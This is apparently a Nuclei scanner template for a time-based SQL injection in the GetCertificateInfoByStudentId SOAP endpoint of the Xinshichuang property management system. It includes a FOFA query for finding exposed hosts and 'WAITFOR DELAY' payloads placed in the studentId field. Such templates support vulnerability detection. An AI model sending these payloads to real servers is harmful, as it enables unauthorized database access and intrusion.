id: xinshichuang-GetCertificateInfoByStudentId-sql

info:
  name: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL延时注入漏洞
  author: unknown
  severity: high
  description: |-
    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
    新视窗新一代物业管理系统的XML Web services接囗GetCertifcatelnfoBvStudentld 实例处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139723251
  tags: sql injection

http:
  - raw:
      - |
        POST  /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
              <studentId>1;WAITFOR DELAY '0:0:3'--</studentId>
            </GetCertificateInfoByStudentId>
          </soap:Body>
        </soap:Envelope>

      - |
        POST  /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
              <studentId>1;WAITFOR DELAY '0:0:6'--</studentId>
            </GetCertificateInfoByStudentId>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=3 && duration_1<=4'  
          - 'duration_2>=6 && duration_2<=7'  
      - type: status
        status: 
          - 200





